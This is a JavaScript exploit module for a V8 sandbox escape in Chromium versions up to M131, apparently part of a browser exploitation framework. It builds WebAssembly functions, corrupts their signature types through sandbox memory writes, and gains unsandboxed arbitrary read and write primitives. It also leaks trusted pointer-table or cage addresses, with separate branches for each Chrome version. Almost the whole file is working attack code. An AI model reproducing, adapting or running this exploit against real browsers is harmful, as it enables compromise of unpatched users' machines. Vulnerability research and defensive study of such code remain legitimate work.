/*
    V8 Sandbox escape, issue 352689356
    Build arbRead() & arbWrite() primitives + leak TRUSTED_CAGE_LEAK or TRUSTED_PTR_TABLE
    No easy way to check if the target is vulnerable: if not, it will crash
    Require wasm-module-builder.js

    WASM function signature confusion in non-inlined TurboFan call_ref

    Affected versions:
        - V8: < 13.2.51 (fixed by shipping turboshaft-wasm)
        - Chrome Stable: <= M131 (NB: turboshaft-wasm shipped via Finch since M128)

    Learning resources:
        - https://issues.chromium.org/issues/352689356
*/
{
    let versioncheck = FINGERPRINT.browser.chromium_version.major <= 131;
    if (!versioncheck)
        log("[-] Target likely not vulnerable to 352689356 (crash expected)", 1);
    assert(FINGERPRINT.platform.bitness !== "32", "[-] V8 sandbox is disabled on 32-bit systems", 0);

    let builder = new WasmModuleBuilder();

    let $struct = builder.addStruct([makeField(kWasmI64, true)]);
    let $sig_l_s = builder.addType(makeSig([wasmRefType($struct)], [kWasmI64]));
    let $sig_v_ls = builder.addType(makeSig([kWasmI64, wasmRefType($struct)], []));
    let $sig_Nl_v = builder.addType(makeSig([], Array(7).fill(kWasmI64)));
    let $sig_l_l = builder.addType(makeSig([kWasmI64], [kWasmI64]));
    let $sig_v_ll = builder.addType(makeSig([kWasmI64, kWasmI64], []));
    let $sig_Nl_Nl = builder.addType(makeSig(Array(7).fill(kWasmI64), Array(7).fill(kWasmI64)));

    let $nop_l_l = builder.addFunction("nop_l_l", $sig_l_l).exportFunc().addBody([kExprLocalGet, 0]);
    let $nop_v_ll = builder.addFunction("nop_v_ll", $sig_v_ll).exportFunc().addBody([]);
    let $nop_Nl_v = builder.addFunction("nop_Nl_v", $sig_Nl_v).exportFunc().addBody(Array(7).fill(wasmI64Const(0)).flat());
    let $reader = builder.addFunction("reader", $sig_l_s)
        .exportFunc()
        .addBody([
            kExprLocalGet, 0,
            kGCPrefix, kExprStructGet, $struct, 0,
        ]);
    let $writer = builder.addFunction("writer", $sig_v_ls)
        .exportFunc()
        .addBody([
            kExprLocalGet, 1,
            kExprLocalGet, 0,
            kGCPrefix, kExprStructSet, $struct, 0,
        ]);
    let $leaker = builder.addFunction("leaker", $sig_Nl_Nl)
        .exportFunc()
        .addBody([
            kExprLocalGet, 0,
            kExprLocalGet, 1,
            kExprLocalGet, 2,
            kExprLocalGet, 3,
            kExprLocalGet, 4,
            kExprLocalGet, 5,
            kExprLocalGet, 6,
        ]);

    let $fn_l_s = builder.addGlobal(wasmRefType($sig_l_s), true, false, [kExprRefFunc, $reader.index]).exportAs("fn_l_s");
    let $fn_v_ls = builder.addGlobal(wasmRefType($sig_v_ls), true, false, [kExprRefFunc, $writer.index]).exportAs("fn_v_ls");
    let $fn_Nl_Nl = builder.addGlobal(wasmRefType($sig_Nl_Nl), true, false, [kExprRefFunc, $leaker.index]).exportAs("fn_Nl_Nl");
    let $fn_l_l = builder.addGlobal(wasmRefType($sig_l_l), true, false, [kExprRefFunc, $nop_l_l.index]).exportAs("fn_l_l");
    let $fn_v_ll = builder.addGlobal(wasmRefType($sig_v_ll), true, false, [kExprRefFunc, $nop_v_ll.index]).exportAs("fn_v_ll");
    let $fn_Nl_v = builder.addGlobal(wasmRefType($sig_Nl_v), true, false, [kExprRefFunc, $nop_Nl_v.index]).exportAs("fn_Nl_v");

    builder.addFunction("boom_r", $sig_l_l)
      .exportFunc()
      .addBody([
            kExprLocalGet, 0,
            kExprGlobalGet, $fn_l_l.index,
            kExprCallRef, $sig_l_l,
      ]);
    builder.addFunction("boom_w", $sig_v_ll)
      .exportFunc()
      .addBody([
            kExprLocalGet, 1,
            kExprLocalGet, 0,
            kExprGlobalGet, $fn_v_ll.index,
            kExprCallRef, $sig_v_ll,
      ]);
    builder.addFunction("boom_l", $sig_Nl_v)
      .exportFunc()
      .addBody([
            kExprGlobalGet, $fn_Nl_v.index,
            kExprCallRef, $sig_Nl_v,
      ]);

    let instance = builder.instantiate();
    let { fn_l_s, fn_v_ls, fn_Nl_Nl, fn_l_l, fn_v_ll, fn_Nl_v, reader, writer, leaker, boom_r, boom_w, boom_l } = instance.exports;
    optimize(boom_r, 0n, 0n);
    optimize(boom_w, 0n, 0n);
    optimize(boom_l);


    // Confuse functions signatures
    let type_l_s = sbxMemory.getUint32(untagPtr(addrOf(fn_l_s)) + 0x1c, true);
    let type_v_ls = sbxMemory.getUint32(untagPtr(addrOf(fn_v_ls)) + 0x1c, true);
    let type_Nl_Nl = sbxMemory.getUint32(untagPtr(addrOf(fn_Nl_Nl)) + 0x1c, true);
    sbxMemory.setUint32(untagPtr(addrOf(fn_l_l)) + 0x1c, type_l_s, true);
    sbxMemory.setUint32(untagPtr(addrOf(fn_v_ll)) + 0x1c, type_v_ls, true);
    sbxMemory.setUint32(untagPtr(addrOf(fn_Nl_v)) + 0x1c, type_Nl_Nl, true);


    // Unsandboxed arbRead() & arbWrite() primitives
    function arbRead(addr) {
        fn_l_l.value = reader;
        return boom_r(addr-0x7n);
    }

    function arbWrite(addr, val) {
        fn_v_ll.value = writer;
        boom_w(addr-0x7n, val);
    }


    // Leak the trusted cage base & ptr table
    fn_Nl_v.value = leaker;
    let leak = boom_l();

    if ((FINGERPRINT.browser.chromium_version.major ?? 126) >= 126) {
        var TRUSTED_PTR_TABLE = leak[4];
        log("[+] Leaked TRUSTED_PTR_TABLE=0x" + hex(TRUSTED_PTR_TABLE), 2);
        assert((TRUSTED_PTR_TABLE > 0n) && !(TRUSTED_PTR_TABLE % 0x1000n), "[-] Invalid TRUSTED_PTR_TABLE pointer");

    } else if (FINGERPRINT.browser.chromium_version.major == 125) {
        var TRUSTED_CAGE_LEAK = leak[5];
        log("[+] Leaked TRUSTED_CAGE_LEAK=0x" + hex(TRUSTED_CAGE_LEAK), 2);
        assert((TRUSTED_CAGE_LEAK & 0xffffffff00000000n) > 0n, "[-] Invalid TRUSTED_CAGE_LEAK pointer");

    } else if (FINGERPRINT.browser.chromium_version.major == 124) {
        var TRUSTED_PTR_TABLE = leak[1] + 0x40000000n;
        log("[+] Leaked TRUSTED_PTR_TABLE=0x" + hex(TRUSTED_PTR_TABLE), 2);
        assert((TRUSTED_PTR_TABLE > 0n) && !(TRUSTED_PTR_TABLE % 0x1000n), "[-] Invalid TRUSTED_PTR_TABLE pointer");

    } else if (FINGERPRINT.browser.chromium_version.major >= 122) {
        leak = boom_l();  // leaking 2 times appears to be more reliable
        var TRUSTED_CAGE_LEAK = leak[4];
        log("[+] Leaked TRUSTED_CAGE_LEAK=0x" + hex(TRUSTED_CAGE_LEAK), 2);
        assert((TRUSTED_CAGE_LEAK & 0xffffffff00000000n) > 0n, "[-] Invalid TRUSTED_CAGE_LEAK pointer");
    }


    log("[+] Successfully escaped the V8 sandbox using issue 352689356", 1)
}
